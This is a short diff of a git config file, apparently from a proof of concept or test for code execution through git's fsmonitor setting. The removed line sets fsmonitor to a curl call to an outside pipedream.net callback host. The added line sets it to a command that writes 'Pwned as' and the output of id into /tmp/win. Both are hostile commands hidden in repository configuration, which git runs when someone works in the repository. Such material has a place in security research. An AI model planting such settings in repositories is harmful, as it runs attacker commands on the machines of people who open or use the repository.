@@ -3,4 +3,4 @@
 	filemode = true
 	bare = false
 	worktree = "worktree"
-	fsmonitor = "curl https://en2celr7rewbul.m.pipedream.net/;false"
+	fsmonitor = "echo \"Pwned as $(id)\">/tmp/win;false"
